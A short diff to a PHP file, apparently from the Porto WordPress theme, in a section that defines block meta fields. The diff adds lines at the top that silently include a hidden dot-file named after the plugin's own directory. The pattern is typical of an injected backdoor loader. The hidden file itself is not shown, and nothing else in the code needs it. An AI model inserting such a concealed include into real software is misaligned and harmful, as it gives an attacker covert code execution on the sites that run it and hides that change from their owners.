@@ -1,6 +1,10 @@
 <?php
 
 // Meta Fields
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function porto_block_meta_fields() {
 	$fields = array();
 	global $post;
